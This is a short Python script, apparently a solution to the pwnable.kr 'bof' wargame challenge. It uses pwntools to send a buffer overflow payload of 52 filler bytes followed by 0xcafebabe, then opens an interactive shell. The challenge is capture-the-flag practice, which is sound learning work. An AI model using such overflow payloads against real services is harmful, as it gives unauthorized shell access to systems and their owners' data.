from pwn import *
sh = remote('pwnable.kr', '9000')

# payload
# because the offset of "0xdeadbeef" is 52.
payload = b'a' * 52 + p32(0xcafebabe)

# PWN
sh.sendline(payload)
sh.interactive()
